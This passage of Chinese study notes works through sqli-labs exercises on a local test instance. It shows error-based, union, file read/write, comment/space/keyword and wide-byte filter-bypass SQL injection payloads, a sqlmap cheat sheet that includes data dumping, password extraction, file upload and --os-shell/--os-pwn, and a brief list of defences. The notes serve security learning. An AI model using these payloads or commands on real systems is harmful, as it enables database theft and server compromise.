上午1.33.30.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623260064290-ecafa471-bc88-48b6-a6fc-120d39eceaa3.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=yyOj5&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.33.30.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=751191&status=done&style=none&title=&width=2696)<br />从而得到当前数据库中的所有表<br />剩余同上
## HTTP-Referer注入
![截屏2021-06-10 上午1.41.25.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623260502648-dc12228f-99e1-4267-b045-bf182953be2a.png#crop=0&crop=0&crop=1&crop=1&height=1666&id=CcibJ&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.41.25.png&originHeight=1666&originWidth=2536&originalType=binary&ratio=1&rotation=0&showTitle=false&size=314805&status=done&style=none&title=&width=2536)<br />输入admin/admin进行登陆<br />登陆后发现页面返回referer，猜测referer存在注入<br />![截屏2021-06-10 上午1.42.18.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623260607589-ab269e00-20fe-4d26-9606-9f4ce345854c.png#crop=0&crop=0&crop=1&crop=1&height=1666&id=cbT1S&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.42.18.png&originHeight=1666&originWidth=2536&originalType=binary&ratio=1&rotation=0&showTitle=false&size=830279&status=done&style=none&title=&width=2536)<br />进行burp抓包<br />在referer后加入 '" 依此判断注入类型<br />![截屏2021-06-10 上午1.48.10.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623260964397-93acdbfb-86c9-4785-9e7d-3c44a7ca2756.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=h98rR&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.48.10.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=676834&status=done&style=none&title=&width=2696)<br />报错中出现逗号，考虑为insert注入<br />insert的语法格式为<br />insert into users values('16','lcamry','lcamry');<br />所以注入时应输入 ' and ' 来闭合前后的单引号<br />Referer: http://127.0.0.1:8081/Less-19/' and '<br />![截屏2021-06-10 上午2.17.30.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623262702648-59349a7d-2866-4b1e-ac9f-d44772abb5ed.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=Jbk5V&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%882.17.30.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=650734&status=done&style=none&title=&width=2696)<br />可见并没有报错<br />之后进行注入<br />输入<br />Referer: http://127.0.0.1:8081/Less-19/' and extractvalue(1,concat(0x7e,version(),0x7e)) and '<br />![截屏2021-06-10 上午2.20.54.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623262884112-5904457c-999c-4246-9019-dd2a884dfc72.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=rbAO3&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%882.20.54.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=645946&status=done&style=none&title=&width=2696)<br />查询数据表名<br />输入<br />Referer: http://127.0.0.1:8081/Less-19/' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and '<br />![截屏2021-06-10 上午2.24.02.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623263084896-eba9b5e6-4e23-437c-862d-9d696ee240ae.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=JvEz5&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%882.24.02.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=653019&status=done&style=none&title=&width=2696)<br />剩余同上
## SQL注入读写文件
**loadfile(file_name)**:读取文件并返回文件的内容作为一个字符串。使用条件：

1. 必须有权限读取并且文件必须完全可读
1. 欲读取文件必须在服务器上
1. 必须指定文件完整的路径
1. 欲读取文件必须小于 max_allowed_packet
### 文件读取
![截屏2021-06-10 下午11.26.43.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623338818458-e0b289bd-d7a0-4f86-8e3d-6df5e041c5a5.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=Up9Jl&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8B%E5%8D%8811.26.43.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=595390&status=done&style=none&title=&width=2604)<br />猜测本题的网站源码放置在如下目录<br />/var/www/html/Less-1<br />利用load_file函数，URL处输入<br />http://127.0.0.1:8081/Less-1/?id=-1' union select 1,2,hex(load_file("/var/www/html/Less-1/index.php")) %23<br />获取index.php的16进制编码形式<br />![截屏2021-06-10 下午11.59.57.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623340863707-1dd74c49-458d-429b-b29d-52b2b69b0b2a.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=l1cHB&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8B%E5%8D%8811.59.57.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=730651&status=done&style=none&title=&width=2604)<br />在burp中进行解码<br />![截屏2021-06-11 上午12.03.16.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623341012601-7a5c4b58-4853-43f3-a76c-32b0fb111803.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=eHSEG&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.03.16.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=386903&status=done&style=none&title=&width=2696)
### 文件写入
**into outfile "绝对路径"**<br />![截屏2021-06-11 上午12.06.39.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623341214228-5c33091d-973e-4518-aeb8-32f36e0b92c3.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=wIjHU&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.06.39.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=873505&status=done&style=none&title=&width=2604)<br />尝试文件写入，输入<br />http://127.0.0.1:8081/Less-7/?id=1')) union select 1,2,3 into outfile "/var/www/html/Less-1/baz.txt" %23<br />文件无法写入，猜测为Linux权限问题，暂时放弃……
# SQL注入绕过技巧
## 绕过注释符过滤
![截屏2021-06-11 上午12.34.49.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623343019236-08f9d8be-885a-40d1-b515-ba279793b126.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=t5cF0&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.34.49.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=888704&status=done&style=none&title=&width=2604)<br />输入<br />http://127.0.0.1:8081/Less-23/?id=1' a%23b<br />发现结果中ab紧挨在一起，判断系统将注释符过滤掉了<br />![截屏2021-06-11 上午12.41.29.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623343310342-e001f341-1a96-4862-aaa2-79c6a42feec6.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=TaHhX&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.41.29.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=976528&status=done&style=none&title=&width=2604)<br />![截屏2021-06-11 上午12.41.36.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623343318588-5219adf9-0c9f-46bf-affd-80ee3c8c4769.png#crop=0&crop=0&crop=1&crop=1&height=186&id=biyQQ&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.41.36.png&originHeight=186&originWidth=382&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9444&status=done&style=none&title=&width=382)<br />--+注释同理也被过滤<br />此处sql 语句为<br />$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";<br />输入<br />http://127.0.0.1:8081/Less-23/?id=-1' union select 1,@@datadir,'3<br />其中-1' union select 1,@@datadir,’3，第一个’(单引号)闭合-1，第二个’(单引号)闭合后面 的。这样将查询内容显示在 username 处<br />![截屏2021-06-11 上午1.07.10.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623344846740-decdec71-98c8-4eb3-8c2f-d08b8c07309b.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=Id63P&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%881.07.10.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=969525&status=done&style=none&title=&width=2604)<br />也可以输入<br />http://127.0.0.1:8081/Less-23/?id=1'or extractvalue(1,concat(0x7e,database(),0x7e)) or '1'='1<br />利用 or '1'='1 进行闭合（ or ' 也可以）<br />![截屏2021-06-11 上午1.12.02.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623345162760-e6900823-81a3-4ca9-82cd-e1aed32a6156.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=wSpyd&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%881.12.02.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=976979&status=done&style=none&title=&width=2604)
## 绕过and/or字符过滤
![截屏2021-06-12 下午4.58.23.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623488324740-68318ba9-d77e-4d0b-a3c3-4c787c234291.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=WKCd3&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%884.58.23.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2360794&status=done&style=none&title=&width=2604)<br />输入<br />http://127.0.0.1:8081/Less-25/?id=-1 2and 4or5'<br />发现此题将and和or都替换为空<br />![截屏2021-06-12 下午5.10.22.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623489087703-66e8ab3a-aabc-46ac-83d3-65e6ee5542de.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=M6Aj8&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.10.22.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1080432&status=done&style=none&title=&width=2604)<br />可以尝试使用 && 和 ||<br />经尝试&&会出现莫名其妙的错误，故使用||<br />输入<br />http://127.0.0.1:8081/Less-25/?id=-1' || extractvalue(1,concat(0x7e,version(),0x7e)) || '<br />![截屏2021-06-12 下午5.19.09.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623489570629-eb59fd85-a04b-48e3-8f99-5738c1ddbc7b.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=rIkoC&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.19.09.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1082062&status=done&style=none&title=&width=2604)<br />查表<br />http://127.0.0.1:8081/Less-25/?id=-1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from **infoorrmation**_schema.tables where table_schema=database()),0x7e)) || '<br />![截屏2021-06-12 下午5.22.01.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623489746996-25111e7a-f3ad-434f-8a21-fc60bab28d68.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=XFIrQ&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.22.01.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1103435&status=done&style=none&title=&width=2604)<br />注意这里会把or置空，所以 information 应写作 infoorrmation 来逃逸
## 绕过空格过滤
如下字符可以当作空格使用

- %09 TAB键（水平）
- %0a 新建一行
- %0c 新的一页
- %0d return功能
- %0b TAB键（垂直）
- %a0 空格
- /**/ 代替空格
- 用()将名词括起来

![截屏2021-06-12 下午5.33.08.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623490402165-c1bc86e5-d408-4421-81d3-8746e56a9ab5.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=kI83X&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.33.08.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1557859&status=done&style=none&title=&width=2604)<br />本题目将空格和注释都过滤掉了<br />输入<br />http://127.0.0.1:8081/Less-26/?id=999' union%a0select%a01,2,'3<br />注意id后面不能写-1了，只能写一个尽可能大的数，因为 - 被过滤了（--为注释）<br />![截屏2021-06-12 下午5.42.31.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623490964675-d07b5209-7a88-4130-b4c7-c8eec3d6aae8.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=aI0FA&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.42.31.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=995260&status=done&style=none&title=&width=2604)

---

![截屏2021-06-12 下午5.43.58.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623491059324-0a4a8b0b-3eb4-44dc-bad2-56539b9719e5.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=UU2Dz&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.43.58.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1621828&status=done&style=none&title=&width=2604)<br />经判断,空格、注释、select、union都被过滤<br />利用 %a0 并且大写union和select的某些字母来绕过<br />输入<br />http://127.0.0.1:8081/Less-27/?id=999'%a0UnIon%a0SeLect%a01,2,'3<br />![截屏2021-06-12 下午9.07.50.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623503390771-2b76c456-66cf-4081-83b2-b8ffa76947c8.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=XRnye&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%889.07.50.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1025992&status=done&style=none&title=&width=2604)<br />查表名<br />输入<br />http://127.0.0.1:8081/Less-27/?id=999'%a0UnIon%a0SeLect%a01,(SeLect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),'3<br />![截屏2021-06-12 下午9.14.07.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623503695965-b559993b-ea22-4c28-98d1-bff7b1626937.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=bf4ZU&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%889.14.07.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1066148&status=done&style=none&title=&width=2604)
## 内联注释绕过
使用/*！内容*/的形式包裹select和union可绕过，如<br />/*!union*//*!select*//*!version()/
## 宽字节注入
原理:mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字(前一个 ascii 码大于 128 才能到汉字的范围)。我们在过滤 ' 的时候，往往利用的思 路是将 ' 转换为 \' 。 因此我们在此想办法将 ' 前面添加的 \ 除掉，一般有两种思路:

1. %df 吃掉 \ 具体的原因是 urlencode(\') = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面􏰀到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。
1. 将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法。

![截屏2021-06-12 下午9.31.25.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623504698949-14531d34-a583-4010-b522-cff09bf005eb.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=NHiSI&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%889.31.25.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=979303&status=done&style=none&title=&width=2604)<br />这里在 ' 前面输入%df 即可逃逸成功<br />![截屏2021-06-12 下午10.20.43.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623507680451-6ac80bce-ffdc-4abb-847d-95dc3fc19966.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=FKi9c&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%8810.20.43.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1028054&status=done&style=none&title=&width=2604)

---


![截屏2021-06-12 下午10.22.48.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623507786008-627a7716-f671-44fa-bcf4-721639679c99.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=YPOph&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%8810.22.48.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=973973&status=done&style=none&title=&width=2604)<br />get型的方式我们是以url形式提交的，因此数据会通过 URLencode，如何将方法用在 post 型的注入当中，我们此处介绍 一个新的方法。将 utf-8 转换为 utf-16 或 utf-32，例如将 ' 转为 utf-16 为 􏰃 ' 。我们就可以利用这个方式进行尝试。<br />![截屏2021-06-12 下午10.33.16.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623508411874-d3530e4c-a917-4eda-af71-fd5f76b8fd33.png#crop=0&crop=0&crop=1&crop=1&height=674&id=jy6TA&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%8810.33.16.png&originHeight=674&originWidth=1472&originalType=binary&ratio=1&rotation=0&showTitle=false&size=659954&status=done&style=none&title=&width=1472)<br />此关卡也可以使用sqlmap更方便地进行注入<br />输入<br />python sqlmap.py -u http://127.0.0.1:8081/Less-34/ --data "uname=admin&passwd=admin" --tamper=unmagicquotes -D security -T users --dump-all<br />即可得到<br />![截屏2021-06-15 上午12.37.39.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623688677237-f6464e08-6377-417e-9a77-cf40d095d470.png#crop=0&crop=0&crop=1&crop=1&height=317&id=Wj04Z&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.37.39.png&originHeight=986&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&size=719881&status=done&style=none&title=&width=253)<br />注意，这里使用了sqlmap的脚本 unmagicquotes.py
# SQLMAP的使用
sqlmap -r http.txt  #http.txt是我们抓取的http的请求包<br />sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测<br />sqlmap -u "http://www.xx.com/username/admin_"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个_来让sqlmap对其注入<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码<br />有时候使用 --passwords 不能获取到密码，则可以试下<br />-D mysql -T user -C host,user,password --dump  当MySQL< 5.7时<br />-D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        #爆出所有的数据库<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     #爆出所有的数据表<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    #爆出数据库中所有的列<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db #查看当前的数据库<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格<br />sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。<br />sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句<br />sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限<br />sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件<br />sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql<br />其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB<br />sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破<br />sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="[http://127.0.0.1:8080](http://127.0.0.1:8080)"    #指定代理<br />当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl<br />sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。<br />支持的探测方式如下：<br />　　B: Boolean-based blind SQL injection（布尔型注入）<br />　　E: Error-based SQL injection（报错型注入）<br />　　U: UNION query SQL injection（可联合查询注入）<br />　　S: Stacked queries SQL injection（可多语句查询注入）<br />　　T: Time-based blind SQL injection（基于时间延迟注入）

sqlmap -d "mysql://root:root@192.168.10.130:3306/mysql" --os-shell   #知道网站的账号密码直接连接

-v3                   #输出详细度  最大值5 会显示请求包和回复包<br />--threads 5           #指定线程数<br />--fresh-queries       #清除缓存<br />--flush-session       #清空会话，重构注入<br />--batch               #对所有的交互式的都是默认的<br />--random-agent        #任意的http头<br />--tamper base64encode            #对提交的数据进行base64编码<br />--referer http://www.baidu.com   #伪造referer字段

--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数
# SQL注入防御手段
## 代码层

- 黑名单
- 白名单
- 敏感字符过滤
- 使用框架安全查询
- 规范输出
## 配置层

- 开启GPC
- 使用UTF-8
## 物理层

- WAF
- 数据库审计
- 云防护
- IPS（入侵防御系统）
